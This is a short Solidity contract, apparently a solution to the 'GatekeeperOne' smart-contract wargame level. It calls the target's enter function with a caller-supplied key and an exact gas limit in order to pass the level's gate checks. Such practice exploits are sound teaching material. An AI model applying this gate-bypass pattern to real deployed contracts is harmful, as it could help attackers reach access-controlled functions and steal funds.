// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.6.0;

import "./13_GatekeeperOne.sol";

contract GatekeeperOneAttack {
    GatekeeperOne public target;

    constructor(address _target) public {
        target = GatekeeperOne(_target);
    }

    function attack(bytes8 key, uint256 gasLimit) public {
        target.enter.gas(gasLimit)(key);
    }
}
